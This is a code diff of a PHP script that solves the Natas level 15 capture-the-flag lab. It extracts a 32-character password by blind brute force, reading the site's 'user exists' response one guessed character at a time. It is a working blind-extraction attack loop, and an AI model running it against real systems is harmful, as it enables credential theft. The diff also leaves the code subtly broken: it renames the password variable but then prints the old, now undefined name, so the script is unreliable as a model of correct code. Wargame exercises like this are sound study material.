@@ -4,15 +4,15 @@ require_once dirname(__DIR__) . '/bootstrap.php';
 $level = 15;
 $username = 'natas' . $level;
 $password = readFlag($level - 1);
-
 $url = sprintf('http://%s.natas.labs.overthewire.org/', $username);
 
 $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+$seenPassword = "";
 
-$guessedPassword = "";
-while (strlen($guessedPassword) < 32) {
+while (strlen($seenPassword) < 32) {
     for ($i = 0; $i < strlen($chars); $i++) {
-        $attempt = $guessedPassword . $chars[$i];
+        $attempt = $seenPassword . $chars[$i];
+        echo 'Trying ' . $attempt . "\n";
 
         $response = $client->request('POST', $url, [
             'auth' => [$username, $password],
@@ -22,11 +22,13 @@ while (strlen($guessedPassword) < 32) {
         ]);
         $body = (string)$response->getBody();
 
-        echo 'trying ' . $attempt . "\n";
         if (stripos($body, "user exists") !== false) {
-            $guessedPassword .= $chars[$i];
+            $seenPassword .= $chars[$i];
 
             break;
         }
     }
 }
+
+echo "\n";
+echo $guessedPassword;
